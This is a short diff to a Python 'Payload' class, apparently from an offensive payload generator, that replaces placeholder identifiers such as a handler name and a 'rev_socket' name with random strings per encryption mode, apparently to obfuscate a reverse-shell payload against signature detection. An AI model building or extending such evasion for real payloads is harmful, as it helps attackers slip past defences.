@@ -94,6 +94,11 @@ class Payload:
             for i in range(5):
                 payload = f'{secrets.token_bytes()}\n' + payload
             letters = string.ascii_letters
+            handler = ''.join(secrets.choice(letters) for i in range(64))
+            if self.encryption == 'hex':
+                payload = payload.replace('hex_handler', handler)
+            if self.encryption == 'base64':
+                payload = payload.replace('base64_hander', handler)
             new_text = ''.join(secrets.choice(letters) for i in range(64))
             payload = payload.replace('new_text', new_text)
             rev_socket = ''.join(secrets.choice(letters) for i in range(64))
